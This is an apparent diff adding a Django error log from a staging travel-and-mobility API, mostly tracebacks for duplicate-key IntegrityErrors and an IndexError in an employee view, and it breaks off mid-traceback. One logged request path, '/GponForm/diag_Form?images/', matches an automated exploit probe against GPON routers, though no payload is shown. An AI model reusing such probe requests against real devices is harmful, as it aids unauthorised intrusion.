@@ -1,0 +1,1304 @@
+ERROR|18/May/2021 12:32:24|log|671285|139849705191168|Internal Server Error: /get_post_approve_travelvisa_request/
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 85, in _execute
+    return self.cursor.execute(sql, params)
+psycopg2.errors.UniqueViolation: duplicate key value violates unique constraint "master_notification_pkey"
+DETAIL:  Key (id)=(5) already exists.
+
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 126, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 124, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/generic/base.py", line 68, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 495, in dispatch
+    response = self.handle_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 455, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 492, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/mobilitysqr_staging/mobility_apps/travel/views.py", line 1280, in post
+    serializernotifications.save()
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/serializers.py", line 214, in save
+    self.instance = self.create(validated_data)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/serializers.py", line 943, in create
+    instance = ModelClass._default_manager.create(**validated_data)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/manager.py", line 82, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/query.py", line 413, in create
+    obj.save(force_insert=True, using=self.db)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 717, in save
+    force_update=force_update, update_fields=update_fields)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 747, in save_base
+    updated = self._save_table(raw, cls, force_insert, force_update, using, update_fields)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 830, in _save_table
+    result = self._do_insert(cls._base_manager, using, fields, update_pk, raw)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 868, in _do_insert
+    using=using, raw=raw)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/manager.py", line 82, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/query.py", line 1133, in _insert
+    return query.get_compiler(using=using).execute_sql(return_id)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/sql/compiler.py", line 1285, in execute_sql
+    cursor.execute(sql, params)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 100, in execute
+    return super().execute(sql, params)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 68, in execute
+    return self._execute_with_wrappers(sql, params, many=False, executor=self._execute)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 77, in _execute_with_wrappers
+    return executor(sql, params, many, context)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 85, in _execute
+    return self.cursor.execute(sql, params)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/utils.py", line 89, in __exit__
+    raise dj_exc_value.with_traceback(traceback) from exc_value
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 85, in _execute
+    return self.cursor.execute(sql, params)
+django.db.utils.IntegrityError: duplicate key value violates unique constraint "master_notification_pkey"
+DETAIL:  Key (id)=(5) already exists.
+
+ERROR|18/May/2021 12:32:24|basehttp|671285|139849705191168|"POST /get_post_approve_travelvisa_request/ HTTP/1.1" 500 22918
+ERROR|18/May/2021 12:36:38|log|671285|139849657747200|Internal Server Error: /get_add/travel_request/
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 85, in _execute
+    return self.cursor.execute(sql, params)
+psycopg2.errors.UniqueViolation: duplicate key value violates unique constraint "travel_travel_request_pkey"
+DETAIL:  Key (id)=(16) already exists.
+
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 126, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 124, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/generic/base.py", line 68, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 495, in dispatch
+    response = self.handle_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 455, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 492, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/mobilitysqr_staging/mobility_apps/travel/views.py", line 245, in post
+    travel_id=serializer.save().travel_req_id
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/serializers.py", line 214, in save
+    self.instance = self.create(validated_data)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/serializers.py", line 943, in create
+    instance = ModelClass._default_manager.create(**validated_data)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/manager.py", line 82, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/query.py", line 413, in create
+    obj.save(force_insert=True, using=self.db)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 717, in save
+    force_update=force_update, update_fields=update_fields)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 747, in save_base
+    updated = self._save_table(raw, cls, force_insert, force_update, using, update_fields)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 830, in _save_table
+    result = self._do_insert(cls._base_manager, using, fields, update_pk, raw)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 868, in _do_insert
+    using=using, raw=raw)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/manager.py", line 82, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/query.py", line 1133, in _insert
+    return query.get_compiler(using=using).execute_sql(return_id)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/sql/compiler.py", line 1285, in execute_sql
+    cursor.execute(sql, params)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 100, in execute
+    return super().execute(sql, params)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 68, in execute
+    return self._execute_with_wrappers(sql, params, many=False, executor=self._execute)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 77, in _execute_with_wrappers
+    return executor(sql, params, many, context)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 85, in _execute
+    return self.cursor.execute(sql, params)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/utils.py", line 89, in __exit__
+    raise dj_exc_value.with_traceback(traceback) from exc_value
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 85, in _execute
+    return self.cursor.execute(sql, params)
+django.db.utils.IntegrityError: duplicate key value violates unique constraint "travel_travel_request_pkey"
+DETAIL:  Key (id)=(16) already exists.
+
+ERROR|18/May/2021 12:36:38|basehttp|671285|139849657747200|"POST /get_add/travel_request/ HTTP/1.1" 500 22879
+ERROR|18/May/2021 12:36:48|log|671285|139849657747200|Internal Server Error: /get_add/travel_request/
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 85, in _execute
+    return self.cursor.execute(sql, params)
+psycopg2.errors.UniqueViolation: duplicate key value violates unique constraint "travel_travel_request_pkey"
+DETAIL:  Key (id)=(17) already exists.
+
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 126, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 124, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/generic/base.py", line 68, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 495, in dispatch
+    response = self.handle_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 455, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 492, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/mobilitysqr_staging/mobility_apps/travel/views.py", line 245, in post
+    travel_id=serializer.save().travel_req_id
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/serializers.py", line 214, in save
+    self.instance = self.create(validated_data)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/serializers.py", line 943, in create
+    instance = ModelClass._default_manager.create(**validated_data)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/manager.py", line 82, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/query.py", line 413, in create
+    obj.save(force_insert=True, using=self.db)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 717, in save
+    force_update=force_update, update_fields=update_fields)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 747, in save_base
+    updated = self._save_table(raw, cls, force_insert, force_update, using, update_fields)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 830, in _save_table
+    result = self._do_insert(cls._base_manager, using, fields, update_pk, raw)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 868, in _do_insert
+    using=using, raw=raw)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/manager.py", line 82, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/query.py", line 1133, in _insert
+    return query.get_compiler(using=using).execute_sql(return_id)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/sql/compiler.py", line 1285, in execute_sql
+    cursor.execute(sql, params)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 100, in execute
+    return super().execute(sql, params)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 68, in execute
+    return self._execute_with_wrappers(sql, params, many=False, executor=self._execute)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 77, in _execute_with_wrappers
+    return executor(sql, params, many, context)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 85, in _execute
+    return self.cursor.execute(sql, params)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/utils.py", line 89, in __exit__
+    raise dj_exc_value.with_traceback(traceback) from exc_value
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 85, in _execute
+    return self.cursor.execute(sql, params)
+django.db.utils.IntegrityError: duplicate key value violates unique constraint "travel_travel_request_pkey"
+DETAIL:  Key (id)=(17) already exists.
+
+ERROR|18/May/2021 12:36:48|basehttp|671285|139849657747200|"POST /get_add/travel_request/ HTTP/1.1" 500 22879
+ERROR|18/May/2021 13:24:40|log|671285|139849919788800|Internal Server Error: /emoloyeeinfo/
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 126, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 124, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/generic/base.py", line 68, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 495, in dispatch
+    response = self.handle_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 455, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 492, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/mobilitysqr_staging/mobility_apps/employee/views.py", line 86, in post
+    if not employees_recent[0]['last_login']:
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/query.py", line 303, in __getitem__
+    return qs._result_cache[0]
+IndexError: list index out of range
+ERROR|18/May/2021 13:24:40|basehttp|671285|139849919788800|"POST /emoloyeeinfo/ HTTP/1.1" 500 18804
+ERROR|18/May/2021 13:24:46|log|671285|139849705191168|Internal Server Error: /emoloyeeinfo/
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 126, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 124, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/generic/base.py", line 68, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 495, in dispatch
+    response = self.handle_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 455, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 492, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/mobilitysqr_staging/mobility_apps/employee/views.py", line 86, in post
+    if not employees_recent[0]['last_login']:
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/query.py", line 303, in __getitem__
+    return qs._result_cache[0]
+IndexError: list index out of range
+ERROR|18/May/2021 13:24:46|basehttp|671285|139849705191168|"POST /emoloyeeinfo/ HTTP/1.1" 500 18804
+ERROR|18/May/2021 13:26:11|log|671285|139849919788800|Internal Server Error: /emoloyeeinfo/
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 126, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 124, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/generic/base.py", line 68, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 495, in dispatch
+    response = self.handle_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 455, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 492, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/mobilitysqr_staging/mobility_apps/employee/views.py", line 86, in post
+    if not employees_recent[0]['last_login']:
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/query.py", line 303, in __getitem__
+    return qs._result_cache[0]
+IndexError: list index out of range
+ERROR|18/May/2021 13:26:11|basehttp|671285|139849919788800|"POST /emoloyeeinfo/ HTTP/1.1" 500 18804
+ERROR|18/May/2021 13:31:03|log|671285|139849705191168|Internal Server Error: /emoloyeeinfo/
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 126, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 124, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/generic/base.py", line 68, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 495, in dispatch
+    response = self.handle_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 455, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 492, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/mobilitysqr_staging/mobility_apps/employee/views.py", line 86, in post
+    if not employees_recent[0]['last_login']:
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/query.py", line 303, in __getitem__
+    return qs._result_cache[0]
+IndexError: list index out of range
+ERROR|18/May/2021 13:31:03|basehttp|671285|139849705191168|"POST /emoloyeeinfo/ HTTP/1.1" 500 18811
+ERROR|18/May/2021 13:50:06|basehttp|671285|139849919788800|"POST /GponForm/diag_Form?images/ HTTP/1.1" 500 59
+ERROR|18/May/2021 14:14:25|basehttp|671285|139849919788800|You're accessing the development server over HTTPS, but it only supports HTTP.
+
+ERROR|18/May/2021 14:39:36|exception|671285|139849928967936|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+ERROR|18/May/2021 14:46:42|log|685516|140164554098432|Internal Server Error: /emoloyeeinfo/
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 126, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 124, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/generic/base.py", line 68, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 495, in dispatch
+    response = self.handle_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 455, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 492, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/mobilitysqr_staging/mobility_apps/employee/views.py", line 86, in post
+    if not employees_recent[0]['last_login']:
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/query.py", line 303, in __getitem__
+    return qs._result_cache[0]
+IndexError: list index out of range
+ERROR|18/May/2021 14:46:42|basehttp|685516|140164554098432|"POST /emoloyeeinfo/ HTTP/1.1" 500 18807
+ERROR|18/May/2021 15:06:52|log|685516|140164177327872|Internal Server Error: /get_add/employee/
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 156, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 154, in _get_response
+    response = response.render()
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/template/response.py", line 106, in render
+    self.content = self.rendered_content
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/response.py", line 72, in rendered_content
+    ret = renderer.render(self.data, accepted_media_type, context)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/renderers.py", line 107, in render
+    allow_nan=not self.strict, separators=separators
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/utils/json.py", line 28, in dumps
+    return json.dumps(*args, **kwargs)
+  File "/usr/lib64/python3.6/json/__init__.py", line 238, in dumps
+    **kw).encode(obj)
+  File "/usr/lib64/python3.6/json/encoder.py", line 199, in encode
+    chunks = self.iterencode(o, _one_shot=True)
+  File "/usr/lib64/python3.6/json/encoder.py", line 257, in iterencode
+    return _iterencode(o, 0)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/utils/encoders.py", line 68, in default
+    return super(JSONEncoder, self).default(obj)
+  File "/usr/lib64/python3.6/json/encoder.py", line 180, in default
+    o.__class__.__name__)
